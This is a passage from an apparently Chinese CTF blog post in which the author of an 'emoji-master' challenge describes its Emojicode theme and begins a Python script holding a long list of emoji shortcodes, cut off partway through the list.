<h3 id="emoji-master"><a href="#emoji-master" class="headerlink" title="emoji-master"></a>emoji-master</h3><h4 id="出题人视角"><a href="#出题人视角" class="headerlink" title="出题人视角"></a>出题人视角</h4><p>👴🏻就是抽象，所以就有了这个题，致敬抽象文学</p>
<p>现翻了翻emojicode就挺有意思，本来可以放字符串的，但是没有节目效果，所以改成了emoji编码，但是有hint，问题不大</p>
<p>emoji随机生成脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> emoji</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">emoji_list = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">:bowtie:</span></span><br><span class="line"><span class="string">:smile:</span></span><br><span class="line"><span class="string">:simple_smile:</span></span><br><span class="line"><span class="string">:laughing:</span></span><br><span class="line"><span class="string">:blush:</span></span><br><span class="line"><span class="string">:smiley:</span></span><br><span class="line"><span class="string">:relaxed:</span></span><br><span class="line"><span class="string">:smirk:</span></span><br><span class="line"><span class="string">:heart_eyes:</span></span><br><span class="line"><span class="string">:kissing_heart:</span></span><br><span class="line"><span class="string">:kissing_closed_eyes:</span></span><br><span class="line"><span class="string">:flushed:</span></span><br><span class="line"><span class="string">:relieved:</span></span><br><span class="line"><span class="string">:satisfied:</span></span><br><span class="line"><span class="string">:grin:</span></span><br><span class="line"><span class="string">:wink:</span></span><br><span class="line"><span class="string">:stuck_out_tongue_winking_eye:</span></span><br><span class="line"><span class="string">:stuck_out_tongue_closed_eyes:</span></span><br><span class="line"><span class="string">:grinning:</span></span><br><span class="line"><span class="string">:kissing:</span></span><br><span class="line"><span class="string">:kissing_smiling_eyes:</span></span><br><span class="line"><span class="string">:stuck_out_tongue:</span></span><br><span class="line"><span class="string">:sleeping:</span></span><br><span class="line"><span class="string">:worried:</span></span><br><span class="line"><span class="string">:frowning:</span></span><br><span class="line"><span class="string">:anguished:</span></span><br><span class="line"><span class="string">:open_mouth:</span></span><br><span class="line"><span class="string">:grimacing:</span></span><br><span class="line"><span class="string">:confused:</span></span><br><span class="line"><span class="string">:hushed:</span></span><br><span class="line"><span class="string">:expressionless:</span></span><br><span class="line"><span class="string">:unamused:</span></span><br><span class="line"><span class="string">:sweat_smile:</span></span><br><span class="line"><span class="string">:sweat:</span></span><br><span class="line"><span class="string">:disappointed_relieved:</span></span><br><span class="line"><span class="string">:weary:</span></span><br><span class="line"><span class="string">:pensive:</span></span><br><span class="line"><span class="string">:disappointed:</span></span><br><span class="line"><span class="string">:confounded:</span></span><br><span class="line"><span class="string">:fearful:</span></span><br><span class="line"><span class="string">:cold_sweat:</span></span><br><span class="line"><span class="string">:persevere:</span></span><br><span class="line"><span class="string">:cry:</span></span><br><span class="line"><span class="string">:sob:</span></span><br><span class="line"><span class="string">:joy:</span></span><br><span class="line"><span class="string">:astonished:</span></span><br><span class="line"><span class="string">:scream:</span></span><br><span class="line"><span class="string">:neckbeard:</span></span><br><span class="line"><span class="string">:tired_face:</span></span><br><span class="line"><span class="string">:angry:</span></span><br><span class="line"><span class="string">:rage:</span></span><br><span class="line"><span class="string">:triumph:</span></span><br><span class="line"><span class="string">:sleepy:</span></span><br><span class="line"><span class="string">:yum:</span></span><br><span class="line"><span class="string">:mask:</span></span><br><span class="line"><span class="string">:sunglasses:</span></span><br><span class="line"><span class="string">:dizzy_face:</span></span><br><span class="line"><span class="string">:imp:</span></span><br><span class="line"><span class="string">:smiling_imp:</span></span><br><span class="line"><span class="string">:neutral_face:</span></span><br><span class="line"><span class="string">:no_mouth:</span></span><br><span class="line"><span class="string">:innocent:</span></span><br><span class="line"><span class="string">:alien:</span></span><br><span class="line"><span class="string">:yellow_heart:</span></span><br><span class="line"><span class="string">:blue_heart:</span></span><br><span class="line"><span class="string">:purple_heart:</span></span><br><span class="line"><span class="string">:heart:</span></span><br><span class="line"><span class="string">:green_heart:</span></span><br><span class="line"><span class="string">:broken_heart:</span></span><br><span class="line"><span class="string">:heartbeat:</span></span><br><span class="line"><span class="string">:heartpulse:</span></span><br><span class="line"><span class="string">:two_hearts:</span></span><br><span class="line"><span class="string">:revolving_hearts:</span></span><br><span class="line"><span class="string">:cupid:</span></span><br><span class="line"><span class="string">:sparkling_heart:</span></span><br><span class="line"><span class="string">:sparkles:</span></span><br><span class="line"><span class="string">:star:</span></span><br><span class="line"><span class="string">:star2:</span></span><br><span class="line"><span class="string">:dizzy:</span></span><br><span class="line"><span class="string">:boom:</span></span><br><span class="line"><span class="string">:collision:</span></span><br><span class="line"><span class="string">:anger:</span></span><br><span class="line"><span class="string">:exclamation:</span></span><br><span class="line"><span class="string">:question:</span></span><br><span class="line"><span class="string">:grey_exclamation:</span></span><br><span class="line"><span class="string">:grey_question:</span></span><br><span class="line"><span class="string">:zzz:</span></span><br><span class="line"><span class="string">:dash:</span></span><br><span class="line"><span class="string">:sweat_drops:</span></span><br><span class="line"><span class="string">:notes:</span></span><br><span class="line"><span class="string">:musical_note:</span></span><br><span class="line"><span class="string">:fire:</span></span><br><span class="line"><span class="string">:hankey:</span></span><br><span class="line"><span class="string">:poop:</span></span><br><span class="line"><span class="string">:shit:</span></span><br><span class="line"><span class="string">:+1:</span></span><br><span class="line"><span class="string">:thumbsup:</span></span><br><span class="line"><span class="string">:-1:</span></span><br><span class="line"><span class="string">:thumbsdown:</span></span><br><span class="line"><span class="string">:ok_hand:</span></span><br><span class="line"><span class="string">:punch:</span></span><br><span class="line"><span class="string">:facepunch:</span></span><br><span class="line"><span class="string">:fist:</span></span><br><span class="line"><span class="string">:v:</span></span><br><span class="line"><span class="string">:wave:</span></span><br><span class="line"><span class="string">:hand:</span></span><br><span class="line"><span class="string">:raised_hand:</span></span><br><span class="line"><span class="string">:open_hands:</span></span><br><span class="line"><span class="string">:point_up:</span></span><br><span class="line"><span class="string">:point_down:</span></span><br><span class="line"><span class="string">:point_left:</span></span><br><span class="line"><span class="string">:point_right:</span></span><br><span class="line"><span class="string">:raised_hands:</span></span><br><span class="line"><span class="string">:pray:</span></span><br><span class="line"><span class="string">:point_up_2:</span></span><br><span class="line"><span class="string">:clap:</span></span><br><span class="line"><span class="string">:muscle:</span></span><br><span class="line"><span class="string">:metal:</span></span><br><span class="line"><span class="string">:fu:</span></span><br><span class="line"><span class="string">:runner:</span></span><br><span class="line"><span class="string">:running:</span></span><br><span class="line"><span class="string">:couple:</span></span><br><span class="line"><span class="string">:family:</span></span><br><span class="line"><span class="string">:two_men_holding_hands:</span></span><br><span class="line"><span class="string">:two_women_holding_hands:</span></span><br><span class="line"><span class="string">:dancer:</span></span><br><span class="line"><span class="string">:dancers:</span></span><br><span class="line"><span class="string">:ok_woman:</span></span><br><span class="line"><span class="string">:no_good:</span></span><br><span class="line"><span class="string">:information_desk_person:</span></span><br><span class="line"><span class="string">:raising_hand:</span></span><br><span class="line"><span class="string">:bride_with_veil:</span></span><br><span class="line"><span class="string">:person_with_pouting_face:</span></span><br><span class="line"><span class="string">:person_frowning:</span></span><br><span class="line"><span class="string">:bow:</span></span><br><span class="line"><span class="string">:couplekiss:</span></span><br><span class="line"><span class="string">:couple_with_heart:</span></span><br><span class="line"><span class="string">:massage:</span></span><br><span class="line"><span class="string">:haircut:</span></span><br><span class="line"><span class="string">:nail_care:</span></span><br><span class="line"><span class="string">:boy:</span></span><br><span class="line"><span class="string">:girl:</span></span><br><span class="line"><span class="string">:woman:</span></span><br><span class="line"><span class="string">:man:</span></span><br><span class="line"><span class="string">:baby:</span></span><br><span class="line"><span class="string">:older_woman:</span></span><br><span class="line"><span class="string">:older_man:</span></span><br><span class="line"><span class="string">:person_with_blond_hair:</span></span><br><span class="line"><span class="string">:man_with_gua_pi_mao:</span></span><br><span class="line"><span class="string">:man_with_turban:</span></span><br><span class="line"><span class="string">:construction_worker:</span></span><br><span class="line"><span class="string">:cop:</span></span><br><span class="line"><span class="string">:angel:</span></span><br><span class="line"><span class="string">:princess:</span></span><br><span class="line"><span class="string">:smiley_cat:</span></span><br><span class="line"><span class="string">:smile_cat:</span></span><br><span class="line"><span class="string">:heart_eyes_cat:</span></span><br><span class="line"><span class="string">:kissing_cat:</span></span><br><span class="line"><span class="string">:smirk_cat:</span></span><br><span class="line"><span class="string">:scream_cat:</span></span><br><span class="line"><span class="string">:crying_cat_face:</span></span><br><span class="line"><span class="string">:joy_cat:</span></span><br><span class="line"><span class="string">:pouting_cat:</span></span><br><span class="line"><span class="string">:japanese_ogre:</span></span><br><span class="line"><span class="string">:japanese_goblin:</span></span><br><span class="line"><span class="string">:see_no_evil:</span></span><br><span class="line"><span class="string">:hear_no_evil:</span></span><br><span class="line"><span class="string">:speak_no_evil:</span></span><br><span class="line"><span class="string">:guardsman:</span></span><br><span class="line"><span class="string">:skull:</span></span><br><span class="line"><span class="string">:feet:</span></span><br><span class="line"><span class="string">:lips:</span></span><br><span class="line"><span class="string">:kiss:</span></span><br><span class="line"><span class="string">:droplet:</span></span><br><span class="line"><span class="string">:ear:</span></span><br><span class="line"><span class="string">:eyes:</span></span><br><span class="line"><span class="string">:nose:</span></span><br><span class="line"><span class="string">:tongue:</span></span><br><span class="line"><span class="string">:love_letter:</span></span><br><span class="line"><span class="string">:bust_in_silhouette:</span></span><br><span class="line"><span class="string">:busts_in_silhouette:</span></span><br><span class="line"><span class="string">:speech_balloon:</span></span><br><span class="line"><span class="string">:thought_balloon:</span></span><br><span class="line"><span class="string">:feelsgood:</span></span><br><span class="line"><span class="string">:finnadie:</span></span><br><span class="line"><span class="string">:goberserk:</span></span><br><span class="line"><span class="string">:godmode:</span></span><br><span class="line"><span class="string">:hurtrealbad:</span></span><br><span class="line"><span class="string">:rage1:</span></span><br><span class="line"><span class="string">:rage2:</span></span><br><span class="line"><span class="string">:rage3:</span></span><br><span class="line"><span class="string">:rage4:</span></span><br><span class="line"><span class="string">:suspect:</span></span><br><span class="line"><span class="string">:trollface:</span></span><br><span class="line"><span class="string">:sunny:</span></span><br><span class="line"><span class="string">:umbrella:</span></span><br><span class="line"><span class="string">:cloud:</span></span><br><span class="line"><span class="string">:snowflake:</span></span><br><span class="line"><span class="string">:snowman:</span></span><br><span class="line"><span class="string">:zap:</span></span><br><span class="line"><span class="string">:cyclone:</span></span><br><span class="line"><span class="string">:foggy:</span></span><br><span class="line"><span class="string">:ocean:</span></span><br><span class="line"><span class="string">:cat:</span></span><br><span class="line"><span class="string">:dog:</span></span><br><span class="line"><span class="string">:mouse:</span></span><br><span class="line"><span class="string">:hamster:</span></span><br><span class="line"><span class="string">:rabbit:</span></span><br><span class="line"><span class="string">:wolf:</span></span><br><span class="line"><span class="string">:frog:</span></span><br><span class="line"><span class="string">:tiger:</span></span><br><span class="line"><span class="string">:koala:</span></span><br><span class="line"><span class="string">:bear:</span></span><br><span class="line"><span class="string">:pig:</span></span><br><span class="line"><span class="string">:pig_nose:</span></span><br><span class="line"><span class="string">:cow:</span></span><br><span class="line"><span class="string">:boar:</span></span><br><span class="line"><span class="string">:monkey_face:</span></span><br><span class="line"><span class="string">:monkey:</span></span><br><span class="line"><span class="string">:horse:</span></span><br><span class="line"><span class="string">:racehorse:</span></span><br><span class="line"><span class="string">:camel:</span></span><br><span class="line"><span class="string">:sheep:</span></span><br><span class="line"><span class="string">:elephant:</span></span><br><span class="line"><span class="string">:panda_face:</span></span><br><span class="line"><span class="string">:snake:</span></span><br><span class="line"><span class="string">:bird:</span></span><br><span class="line"><span class="string">:baby_chick:</span></span><br><span class="line"><span class="string">:hatched_chick:</span></span><br><span class="line"><span class="string">:hatching_chick:</span></span><br><span class="line"><span class="string">:chicken:</span></span><br><span class="line"><span class="string">:penguin:</span></span><br><span class="line"><span class="string">:turtle:</span></span><br><span class="line"><span class="string">:bug:</span></span><br><span class="line"><span class="string">:honeybee:</span></span><br><span class="line"><span class="string">:ant:</span></span><br><span class="line"><span class="string">:beetle:</span></span><br><span class="line"><span class="string">:snail:</span></span><br><span class="line"><span class="string">:octopus:</span></span><br><span class="line"><span class="string">:tropical_fish:</span></span><br><span class="line"><span class="string">:fish:</span></span><br><span class="line"><span class="string">:whale:</span></span><br><span class="line"><span class="string">:whale2:</span></span><br><span class="line"><span class="string">:dolphin:</span></span><br><span class="line"><span class="string">:cow2:</span></span><br><span class="line"><span class="string">:ram:</span></span><br><span class="line"><span class="string">:rat:</span></span><br><span class="line"><span class="string">:water_buffalo:</span></span><br><span class="line"><span class="string">:tiger2:</span></span><br><span class="line"><span class="string">:rabbit2:</span></span><br><span class="line"><span class="string">:dragon:</span></span><br><span class="line"><span class="string">:goat:</span></span><br><span class="line"><span class="string">:rooster:</span></span><br><span class="line"><span class="string">:dog2:</span></span><br><span class="line"><span class="string">:pig2:</span></span><br><span class="line"><span class="string">:mouse2:</span></span><br><span class="line"><span class="string">:ox:</span></span><br><span class="line"><span class="string">:dragon_face:</span></span><br><span class="line"><span class="string">:blowfish:</span></span><br><span class="line"><span class="string">:crocodile:</span></span><br><span class="line"><span class="string">:dromedary_camel:</span></span><br><span class="line"><span class="string">:leopard:</span></span><br><span class="line"><span class="string">:cat2:</span></span><br><span class="line"><span class="string">:poodle:</span></span><br><span class="line"><span class="string">:paw_prints:</span></span><br><span class="line"><span class="string">:bouquet:</span></span><br><span class="line"><span class="string">:cherry_blossom:</span></span><br><span class="line"><span class="string">:tulip:</span></span><br><span class="line"><span class="string">:four_leaf_clover:</span></span><br><span class="line"><span class="string">:rose:</span></span><br><span class="line"><span class="string">:sunflower:</span></span><br><span class="line"><span class="string">:hibiscus:</span></span><br><span class="line"><span class="string">:maple_leaf:</span></span><br><span class="line"><span class="string">:leaves:</span></span><br><span class="line"><span class="string">:fallen_leaf:</span></span><br><span class="line"><span class="string">:herb:</span></span><br><span class="line"><span class="string">:mushroom:</span></span><br><span class="line"><span class="string">:cactus:</span></span><br><span class="line"><span class="string">:palm_tree:</span></span><br><span class="line"><span class="string">:evergreen_tree:</span></span><br><span class="line"><span class="string">:deciduous_tree:</span></span><br><span class="line"><span class="string">:chestnut:</span></span><br><span class="line"><span class="string">:seedling:</span></span><br><span class="line"><span class="string">:blossom:</span></span><br><span class="line"><span class="string">:ear_of_rice:</span></span><br><span class="line"><span class="string">:shell:</span></span><br><span class="line"><span class="string">:globe_with_meridians:</span></span><br><span class="line"><span class="string">:sun_with_face:</span></span><br><span class="line"><span class="string">:full_moon_with_face:</span></span><br><span class="line"><span class="string">:new_moon_with_face:</span></span><br><span class="line"><span class="string">:new_moon:</span></span><br><span class="line"><span class="string">:waxing_crescent_moon:</span></span><br><span class="line"><span class="string">:first_quarter_moon:</span></span><br><span class="line"><span class="string">:waxing_gibbous_moon:</span></span><br><span class="line"><span class="string">:full_moon:</span></span><br><span class="line"><span class="string">:waning_gibbous_moon:</span></span><br><span class="line"><span class="string">:last_quarter_moon:</span></span><br><span class="line"><span class="string">:waning_crescent_moon:</span></span><br><span class="line"><span class="string">:last_quarter_moon_with_face:</span></span><br><span class="line"><span class="string">:first_quarter_moon_with_face:</span></span><br><span class="line"><span class="string">:crescent_moon:</span></span><br><span class="line"><span class="string">:earth_africa:</span></span><br><span class="line"><span class="string">:earth_americas:</span></span><br><span class="line"><span class="string">:earth_asia:</span></span><br><span class="line"><span class="string">:volcano:</span></span><br><span class="line"><span class="string">:milky_way:</span></span><br><span class="line"><span class="string">:partly_sunny:</span></span><br><span class="line"><span class="string">:octocat:</span></span><br><span class="line"><span class="string">:squirrel:</span></span><br><span class="line"><span class="string">:bamboo:</span></span><br><span class="line"><span class="string">:gift_heart:</span></span><br><span class="line"><span class="string">:dolls:</span></span><br><span class="line"><span class="string">:school_satchel:</span></span><br><span class="line"><span class="string">:mortar_board:</span></span><br><span class="line"><span class="string">:flags:</span></span><br><span class="line"><span class="string">:fireworks:</span></span><br><span class="line"><span class="string">:sparkler:</span></span><br><span class="line"><span class="string">:wind_chime:</span></span><br><span class="line"><span class="string">:rice_scene:</span></span><br><span class="line"><span class="string">:jack_o_lantern:</span></span><br><span class="line"><span class="string">:ghost:</span></span><br><span class="line"><span class="string">:santa:</span></span><br><span class="line"><span class="string">:christmas_tree:</span></span><br><span class="line"><span class="string">:gift:</span></span><br><span class="line"><span class="string">:bell:</span></span><br><span class="line"><span class="string">:no_bell:</span></span><br><span class="line"><span class="string">:tanabata_tree:</span></span><br><span class="line"><span class="string">:tada:</span></span><br><span class="line"><span class="string">:confetti_ball:</span></span><br><span class="line"><span class="string">:balloon:</span></span><br><span class="line"><span class="string">:crystal_ball:</span></span><br><span class="line"><span class="string">:cd:</span></span><br><span class="line"><span class="string">:dvd:</span></span><br><span class="line"><span class="string">:floppy_disk:</span></span><br><span class="line"><span class="string">:camera:</span></span><br><span class="line"><span class="string">:video_camera:</span></span><br><span class="line"><span class="string">:movie_camera:</span></span><br><span class="line"><span class="string">:computer:</span></span><br><span class="line"><span class="string">:tv:</span></span><br><span class="line"><span class="string">:iphone:</span></span><br><span class="line"><span class="string">:phone:</span></span><br><span class="line"><span class="string">:telephone:</span></span><br><span class="line"><span class="string">:telephone_receiver:</span></span><br><span class="line"><span class="string">:pager:</span></span><br><span class="line"><span class="string">:fax:</span></span><br><span class="line"><span class="string">:minidisc:</span></span><br><span class="line"><span class="string">:vhs:</span></span><br><span class="line"><span class="string">:sound:</span></span><br><span class="line"><span class="string">:speaker:</span></span><br><span class="line"><span class="string">:mute:</span></span><br><span class="line"><span class="string">:loudspeaker:</span></span><br><span class="line"><span class="string">:mega:</span></span><br><span class="line"><span class="string">:hourglass:</span></span><br><span class="line"><span class="string">:hourglass_flowing_sand:</span></span><br><span class="line"><span class="string">:alarm_clock:</span></span><br><span class="line"><span class="string">:watch:</span></span><br><span class="line"><span class="string">:radio:</span></span><br><span class="line"><span class="string">:satellite:</span></span><br><span class="line"><span class="string">:loop:</span></span><br><span class="line"><span class="string">:mag:</span></span><br><span class="line"><span class="string">:mag_right:</span></span><br><span class="line"><span class="string">:unlock:</span></span><br><span class="line"><span class="string">:lock:</span></span><br><span class="line"><span class="string">:lock_with_ink_pen:</span></span><br><span class="line"><span class="string">:closed_lock_with_key:</span></span><br><span class="line"><span class="string">:key:</span></span><br><span class="line"><span class="string">:bulb:</span></span><br><span class="line"><span class="string">:flashlight:</span></span><br><span class="line"><span class="string">:high_brightness:</span></span><br><span class="line"><span class="string">:low_brightness:</span></span><br><span class="line"><span class="string">:electric_plug:</span></span><br><span class="line"><span class="string">:battery:</span></span><br><span class="line"><span class="string">:calling:</span></span><br><span class="line"><span class="string">:email:</span></span><br><span class="line"><span class="string">:mailbox:</span></span><br><span class="line"><span class="string">:postbox:</span></span><br><span class="line"><span class="string">:bath:</span></span><br><span class="line"><span class="string">:bathtub:</span></span><br><span class="line"><span class="string">:shower:</span></span><br><span class="line"><span class="string">:toilet:</span></span><br><span class="line"><span class="string">:wrench:</span></span><br><span class="line"><span class="string">:nut_and_bolt:</span></span><br><span class="line"><span class="string">:hammer:</span></span><br><span class="line"><span class="string">:seat:</span></span><br><span class="line"><span class="string">:moneybag:</span></span><br><span class="line"><span class="string">:yen:</span></span><br><span class="line"><span class="string">:dollar:</span></span><br><span class="line"><span class="string">:pound:</span></span><br><span class="line"><span class="string">:euro:</span></span><br><span class="line"><span class="string">:credit_card:</span></span><br><span class="line"><span class="string">:money_with_wings:</span></span><br><span class="line"><span class="string">:e-mail:</span></span><br><span class="line"><span class="string">:inbox_tray:</span></span><br><span class="line"><span class="string">:outbox_tray:</span></span><br><span class="line"><span class="string">:envelope:</span></span><br><span class="line"><span class="string">:incoming_envelope:</span></span><br><span class="line"><span class="string">:postal_horn:</span></span><br><span class="line"><span class="string">:mailbox_closed:</span></span><br><span class="line"><span class="string">:mailbox_with_mail:</span></span><br><span class="line"><span class="string">:mailbox_with_no_mail:</span></span><br><span class="line"><span class="string">:package:</span></span><br><span class="line"><span class="string">:door:</span></span><br><span class="line"><span class="string">:smoking:</span></span><br><span class="line"><span class="string">:bomb:</span></span><br><span class="line"><span class="string">:gun:</span></span><br><span class="line"><span class="string">:hocho:</span></span><br><span class="line"><span class="string">:pill:</span></span><br><span class="line"><span class="string">:syringe:</span></span><br><span class="line"><span class="string">:page_facing_up:</span></span><br><span class="line"><span class="string">:page_with_curl:</span></span><br><span class="line"><span class="string">:bookmark_tabs:</span></span><br><span class="line"><span class="string">:bar_chart:</span></span><br><span class="line"><span class="string">:chart_with_upwards_trend:</span></span><br><span class="line"><span class="string">:chart_with_downwards_trend:</span></span><br><span class="line"><span class="string">:scroll:</span></span><br><span class="line"><span class="string">:clipboard:</span></span><br><span class="line"><span class="string">:calendar:</span></span><br><span class="line"><span class="string">:date:</span></span><br><span class="line"><span class="string">:card_index:</span></span><br><span class="line"><span class="string">:file_folder:</span></span><br><span class="line"><span class="string">:open_file_folder:</span></span><br><span class="line"><span class="string">:scissors:</span></span><br><span class="line"><span class="string">:pushpin:</span></span><br><span class="line"><span class="string">:paperclip:</span></span><br><span class="line"><span class="string">:black_nib:</span></span><br><span class="line"><span class="string">:pencil2:</span></span><br><span class="line"><span class="string">:straight_ruler:</span></span><br><span class="line"><span class="string">:triangular_ruler:</span></span><br><span class="line"><span class="string">:closed_book:</span></span><br><span class="line"><span class="string">:green_book:</span></span><br><span class="line"><span class="string">:blue_book:</span></span><br><span class="line"><span class="string">:orange_book:</span></span><br><span class="line"><span class="string">:notebook:</span></span><br><span class="line"><span class="string">:notebook_with_decorative_cover:</span></span><br><span class="line"><span class="string">:ledger:</span></span><br><span class="line"><span class="string">:books:</span></span><br><span class="line"><span class="string">:bookmark:</span></span><br><span class="line"><span class="string">:name_badge:</span></span><br><span class="line"><span class="string">:microscope:</span></span><br><span class="line"><span class="string">:telescope:</span></span><br><span class="line"><span class="string">:newspaper:</span></span><br><span class="line"><span class="string">:football:</span></span><br><span class="line"><span class="string">:basketball:</span></span><br><span class="line"><span class="string">:soccer:</span></span><br><span class="line"><span class="string">:baseball:</span></span><br><span class="line"><span class="string">:tennis:</span></span><br><span class="line"><span class="string">:8ball:</span></span><br><span class="line"><span class="string">:rugby_football:</span></span><br><span class="line"><span class="string">:bowling:</span></span><br><span class="line"><span class="string">:golf:</span></span><br><span class="line"><span class="string">:mountain_bicyclist:</span></span><br><span class="line"><span class="string">:bicyclist:</span></span><br><span class="line"><span class="string">:horse_racing:</span></span><br><span class="line"><span class="string">:snowboarder:</span></span><br><span class="line"><span class="string">:swimmer:</span></span><br><span class="line"><span class="string">:surfer:</span></span><br><span class="line"><span class="string">:ski:</span></span><br><span class="line"><span class="string">:spades:</span></span><br><span class="line"><span class="string">:hearts:</span></span><br><span class="line"><span class="string">:clubs:</span></span><br><span class="line"><span class="string">:diamonds:</span></span><br><span class="line"><span class="string">:gem:</span></span><br><span class="line"><span class="string">:ring:</span></span><br><span class="line"><span class="string">:trophy:</span></span><br><span class="line"><span class="string">:musical_score:</span></span><br><span class="line"><span class="string">:musical_keyboard:</span></span><br><span class="line"><span class="string">:violin:</span></span><br><span class="line"><span class="string">:space_invader:</span></span><br><span class="line"><span class="string">:video_game:</span></span><br><span class="line"><span class="string">:black_joker:</span></span><br><span class="line"><span class="string">:flower_playing_cards:</span></span><br><span class="line"><span class="string">:game_die:</span></span><br><span class="line"><span class="string">:dart:</span></span><br><span class="line"><span class="string">:mahjong:</span></span><br><span class="line"><span class="string">:clapper:</span></span><br><span class="line"><span class="string">:memo:</span></span><br><span class="line"><span class="string">:pencil:</span></span><br><span class="line"><span class="string">:book:</span></span><br><span class="line"><span class="string">:art:</span></span><br><span class="line"><span class="string">:microphone:</span></span><br><span class="line"><span class="string">:headphones:</span></span><br><span class="line"><span class="string">:trumpet:</span></span><br><span class="line"><span class="string">:saxophone:</span></span><br><span class="line"><span class="string">:guitar:</span></span><br><span class="line"><span class="string">:shoe:</span></span><br><span class="line"><span class="string">:sandal:</span></span><br><span class="line"><span class="string">:high_heel:</span></span><br><span class="line"><span class="string">:lipstick:</span></span><br><span class="line"><span class="string">:boot:</span></span><br><span class="line"><span class="string">:shirt:</span></span><br><span class="line"><span class="string">:tshirt:</span></span><br><span class="line"><span class="string">:necktie:</span></span><br><span class="line"><span class="string">:womans_clothes:</span></span><br><span class="line"><span class="string">:dress:</span></span><br><span class="line"><span class="string">:running_shirt_with_sash:</span></span><br><span class="line"><span class="string">:jeans:</span></span><br><span class="line"><span class="string">:kimono:</span></span><br><span class="line"><span class="string">:bikini:</span></span><br><span class="line"><span class="string">:ribbon:</span></span><br><span class="line"><span class="string">:tophat:</span></span><br><span class="line"><span class="string">:crown:</span></span><br><span class="line"><span class="string">:womans_hat:</span></span><br><span class="line"><span class="string">:mans_shoe:</span></span><br><span class="line"><span class="string">:closed_umbrella:</span></span><br><span class="line"><span class="string">:briefcase:</span></span><br><span class="line"><span class="string">:handbag:</span></span><br><span class="line"><span class="string">:pouch:</span></span><br><span class="line"><span class="string">:purse:</span></span><br><span class="line"><span class="string">:eyeglasses:</span></span><br><span class="line"><span class="string">:fishing_pole_and_fish:</span></span><br><span class="line"><span class="string">:coffee:</span></span><br><span class="line"><span class="string">:tea:</span></span><br><span class="line"><span class="string">:sake:</span></span><br><span class="line"><span class="string">:baby_bottle:</span></span><br><span class="line"><span class="string">:beer:</span></span><br><span class="line"><span class="string">:beers:</span></span><br><span class="line"><span class="string">:cocktail:</span></span><br><span class="line"><span class="string">:tropical_drink:</span></span><br><span class="line"><span class="string">:wine_glass:</span></span><br><span class="line"><span class="string">:fork_and_knife:</span></span><br><span class="line"><span class="string">:pizza:</span></span><br><span class="line"><span class="string">:hamburger:</span></span><br><span class="line"><span class="string">:fries:</span></span><br><span class="line"><span class="string">:poultry_leg:</span></span><br><span class="line"><span class="string">:meat_on_bone:</span></span><br><span class="line"><span class="string">:spaghetti:</span></span><br><span class="line"><span class="string">:curry:</span></span><br><span class="line"><span class="string">:fried_shrimp:</span></span><br><span class="line"><span class="string">:bento:</span></span><br><span class="line"><span class="string">:sushi:</span></span><br><span class="line"><span class="string">:fish_cake:</span></span><br><span class="line"><span class="string">:rice_ball:</span></span><br><span class="line"><span class="string">:rice_cracker:</span></span><br><span class="line"><span class="string">:rice:</span></span><br><span class="line"><span class="string">:ramen:</span></span><br><span class="line"><span class="string">:stew:</span></span><br><span class="line"><span class="string">:oden:</span></span><br><span class="line"><span class="string">:dango:</span></span><br><span class="line"><span class="string">:egg:</span></span><br><span class="line"><span class="string">:bread:</span></span><br><span class="line"><span class="string">:doughnut:</span></span><br><span class="line"><span class="string">:custard:</span></span><br><span class="line"><span class="string">:icecream:</span></span><br><span class="line"><span class="string">:ice_cream:</span></span><br><span class="line"><span class="string">:shaved_ice:</span></span><br><span class="line"><span class="string">:birthday:</span></span><br><span class="line"><span class="string">:cake:</span></span><br><span class="line"><span class="string">:cookie:</span></span><br><span class="line"><span class="string">:chocolate_bar:</span></span><br><span class="line"><span class="string">:candy:</span></span><br><span class="line"><span class="string">:lollipop:</span></span><br><span class="line"><span class="string">:honey_pot:</span></span><br><span class="line"><span class="string">:apple:</span></span><br><span class="line"><span class="string">:green_apple:</span></span><br><span class="line"><span class="string">:tangerine:</span></span><br><span class="line"><span class="string">:lemon:</span></span><br><span class="line"><span class="string">:cherries:</span></span><br><span class="line"><span class="string">:grapes:</span></span><br><span class="line"><span class="string">:watermelon:</span></span><br><span class="line"><span class="string">:strawberry:</span></span><br><span class="line"><span class="string">:peach:</span></span><br><span class="line"><span class="string">:melon:</span></span><br><span class="line"><span class="string">:banana:</span></span><br><span class="line"><span class="string">:pear:</span></span><br><span class="line"><span class="string">:pineapple:</span></span><br><span class="line"><span class="string">:sweet_potato:</span></span><br><span class="line"><span class="string">:eggplant:</span></span><br><span class="line"><span class="string">:tomato:</span></span><br><span class="line"><span class="string">:corn:</span></span><br><span class="line"><span class="string">:house:</span></span><br><span class="line"><span class="string">:house_with_garden:</span></span><br><span class="line"><span class="string">:school:</span></span><br><span class="line"><span class="string">:office:</span></span><br><span class="line"><span class="string">:post_office:</span></span><br><span class="line"><span class="string">:hospital:</span></span><br><span class="line"><span class="string">:bank:</span></span><br><span class="line"><span class="string">:convenience_store:</span></span><br><span class="line"><span class="string">:love_hotel:</span></span><br><span class="line"><span class="string">:hotel:</span></span><br><span class="line"><span class="string">:wedding:</span></span><br><span class="line"><span class="string">:church:</span></span><br><span class="line"><span class="string">:department_store:</span></span><br><span class="line"><span class="string">:european_post_office:</span></span><br><span class="line"><span class="string">:city_sunrise:</span></span><br><span class="line"><span class="string">:city_sunset:</span></span><br><span class="line"><span class="string">:japanese_castle:</span></span><br><span class="line"><span class="string">:european_castle:</span></span><br><span class="line"><span class="string">:tent:</span></span><br><span class="line"><span class="string">:factory:</span></span><br><span class="line"><span class="string">:tokyo_tower:</span></span><br><span class="line"><span class="string">:japan:</span></span><br><span class="line"><span class="string">:mount_fuji:</span></span><br><span class="line"><span class="string">:sunrise_over_mountains:</span></span><br><span class="line"><span class="string">:sunrise:</span></span><br><span class="line"><span class="string">:stars:</span></span><br><span class="line"><span class="string">:statue_of_liberty:</span></span><br><span class="line"><span class="string">:bridge_at_night:</span></span><br><span class="line"><span class="string">:carousel_horse:</span></span><br><span class="line"><span class="string">:rainbow:</span></span><br><span class="line"><span class="string">:ferris_wheel:</span></span><br><span class="line"><span class="string">:fountain:</span></span><br><span class="line"><span class="string">:roller_coaster:</span></span><br><span class="line"><span class="string">:ship:</span></span><br><span class="line"><span class="string">:speedboat:</span></span><br><span class="line"><span class="string">:boat:</span></span><br><span class="line"><span class="string">:sailboat:</span></span><br><span class="line"><span class="string">:rowboat:</span></span><br><span class="line"><span class="string">:anchor:</span></span><br><span class="line"><span class="string">:rocket:</span></span><br><span class="line"><span class="string">:airplane:</span></span><br><span class="line"><span 